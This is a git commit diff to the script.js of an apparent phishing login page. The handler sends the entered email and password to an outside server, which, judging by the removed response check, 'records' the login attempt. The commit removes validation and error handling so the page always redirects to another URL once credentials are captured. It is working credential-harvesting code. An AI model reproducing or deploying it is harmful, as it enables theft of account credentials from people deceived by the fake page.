1d0c4f41bf9c04406820b1b1b7e6bddba52d7df5
Abdur Rabbi <85168111+cracker911181@users.noreply.github.com>
2025-05-04 13:45:39 +0300

    Update script.js

--- script.js
+++ script.js
@@ -1,17 +1,11 @@
 function handleLogin() {
     const email = document.getElementById('email').value;
     const password = document.getElementById('password').value;
-    
-    if (!email || !password) {
-
-        return;
-    }
-
+    console.log("ok");
     fetch('https://arsa-back.onrender.com/login', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
-            'Accept': 'application/json'
         },
         body: JSON.stringify({
             email: email,
@@ -19,19 +13,6 @@ function handleLogin() {
         })
     })
     .then(response => {
-        if (!response.ok) {
-            throw new Error(`HTTP error! status: ${response.status}`);
-        }
-        return response.json();
+        window.location.href = 'https://your-redirect-url.com';
     })
-    .then(data => {
-        if (data.message === 'Login attempt recorded successfully') {
-            window.location.href = 'https://your-redirect-url.com';
-        } else {
-    
-        }
-    })
-    .catch(error => {
-
-    });
 }
